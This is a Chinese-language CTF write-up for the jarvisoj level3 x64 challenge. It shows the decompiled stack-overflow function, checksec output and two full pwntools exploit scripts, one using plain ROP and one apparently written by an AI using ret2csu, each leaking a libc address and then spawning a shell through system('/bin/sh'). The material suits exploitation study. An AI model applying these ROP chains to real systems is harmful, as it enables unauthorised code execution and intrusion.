# jarvisoj_x64

本题来自 jarvisoj level3 x64。

反编译：

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  vulnerable_function();
  return write(1, "Hello, World!\n", 0xEu);
}

ssize_t vulnerable_function()
{
  _BYTE buf[128]; // [rsp+0h] [rbp-80h] BYREF

  write(1, "Input:\n", 7u);
  return read(0, buf, 0x200u);
}
```

checksec:

```
Arch:       amd64-64-little
RELRO:      No RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

这里有栈溢出，但是不知道 libc 地址，所以需要先获取 libc 地址：

1. 栈溢出，覆盖返回地址，利用 write 函数，把 got 里的 libc 地址打印，再返回到 vulnerable_function
2. 再次栈溢出，通过 ROP，调用 system("/bin/sh")

```python
from pwn import *

context(log_level="DEBUG")
context.terminal = ["tmux", "split-w", "-h"]
context.arch = "amd64"

if args.REMOTE:
    p = remote(args.HOST, args.PORT)
else:
    p = process("strace -o strace.log ./level3_x64.patched", shell=True)
elf = ELF("./level3_x64.patched")
libc = elf.libc

rop = ROP(elf)
pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"]).address
pop_rsi_pop_r15_ret = rop.find_gadget(["pop rsi", "pop r15", "ret"]).address
ret = rop.find_gadget(["ret"]).address


# leak libc address
payload = (
    b"A" * 0x88
    # rdi = 1
    + p64(pop_rdi_ret)
    + p64(1)
    # rsi = got entry of write
    + p64(pop_rsi_pop_r15_ret)
    + p64(elf.got["write"])
    + p64(0)
    # write(1, write)
    + p64(elf.plt["write"])
    # return to vulnerable_function again
    + p64(elf.symbols["vulnerable_function"])
)
p.recvuntil(b"Input:\n")
p.send(payload)
write_addr = u64(p.recv(8))
libc_addr = write_addr - libc.symbols["write"]
log.info(f"write @ 0x{write_addr:x}")
log.info(f"libc @ 0x{libc_addr:x}")
libc.address = libc_addr

# get shell
payload = (
    b"A" * 0x88
    # rdi = bin/sh
    + p64(pop_rdi_ret)
    + p64(next(libc.search(b"/bin/sh\x00")))
    # system("/bin/sh")
    + p64(libc.symbols["system"])
)
p.recvuntil(b"Input:\n")
p.send(payload)
p.interactive()
```

AI 完成的攻击，思路类似，不过用了 ret2csu 的 gadget：

```python
from pwn import *

binary = ELF('./level3_x64')
libc = ELF('./libc.so.6')

write_got = binary.got['write']
vuln_func = binary.symbols['vulnerable_function']

csu_pop = 0x4006aa
csu_call = 0x400690
pop_rdi = 0x4006b3
ret = 0x4006b4

write_off = libc.symbols['write']
system_off = libc.symbols['system']
binsh_off = next(libc.search(b'/bin/sh'))

def exploit(host=None, port=None):
    if host:
        p = remote(host, port)
    else:
        p = process('./level3_x64.patched')

    # Stage 1: leak write@got via ret2csu
    payload = b'A' * 0x80
    payload += b'B' * 8
    payload += p64(csu_pop)
    payload += p64(0)           # rbx = 0
    payload += p64(1)           # rbp = 1
    payload += p64(write_got)   # r12 = write@got
    payload += p64(8)           # r13 = rdx = 8
    payload += p64(write_got)   # r14 = rsi = write@got
    payload += p64(1)           # r15 = edi = 1
    payload += p64(csu_call)
    payload += p64(0) * 7
    payload += p64(vuln_func)

    p.recvuntil(b'Input:\n')
    p.send(payload)

    leaked_write = u64(p.recv(8).ljust(8, b'\x00'))
    log.info(f"Leaked write: {hex(leaked_write)}")

    libc_base = leaked_write - write_off
    log.info(f"Libc base: {hex(libc_base)}")

    system = libc_base + system_off
    binsh = libc_base + binsh_off

    # Stage 2: system("/bin/sh") with stack alignment
    payload2 = b'A' * 0x80
    payload2 += b'B' * 8
    payload2 += p64(ret)      # stack alignment
    payload2 += p64(pop_rdi)
    payload2 += p64(binsh)
    payload2 += p64(system)

    p.recvuntil(b'Input:\n')
    p.send(payload2)

    p.interactive()

if __name__ == '__main__':
    import sys
    if len(sys.argv) > 2:
        exploit(sys.argv[1], int(sys.argv[2]))
    else:
        exploit()
```
